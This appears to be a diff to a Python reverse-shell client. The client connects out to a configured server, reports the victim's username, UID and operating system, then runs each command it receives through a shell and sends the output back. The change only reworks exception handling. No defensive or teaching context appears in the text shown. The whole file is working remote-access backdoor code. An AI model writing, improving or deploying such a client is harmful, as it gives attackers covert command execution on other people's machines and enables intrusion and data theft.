@@ -6,14 +6,15 @@ import pwd
 import platform
 import time
 def session_handler():
-    sock.connect((server_ip,server_port))
-    conn_out(pwd.getpwuid(os.getuid())[0])
-    conn_out(os.getuid())
-    time.sleep(1)
-    conn_out(platform.uname()[0]+platform.uname()[2])
-    print("Connected with ", server_ip)
-    while True:
-        try:
+    try:
+        sock.connect((server_ip,server_port))
+        conn_out(pwd.getpwuid(os.getuid())[0])
+        conn_out(os.getuid())
+        time.sleep(1)
+        conn_out(platform.uname()[0]+platform.uname()[2])
+
+        print("Connected with ", server_ip)
+        while True:
             msg = conn_in()
             if msg == "exit":
                 print("Server terminated connection")
@@ -39,13 +40,14 @@ def session_handler():
                 com = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 res = com.stdout.read() + com.stderr.read()
                 conn_out(res.decode())
-        except KeyboardInterrupt:
-            print('\n keyboard interrupt issued')
-            sock.close()
-            break
-        except Exception:
-            sock.close()
-            break
+    except ConnectionRefusedError:
+        pass
+    except KeyboardInterrupt:
+        print('\n keyboard interrupt issued')
+        sock.close()    
+    except Exception:
+        sock.close()
+
 def conn_in():
     print("waiting for server")
     while True:
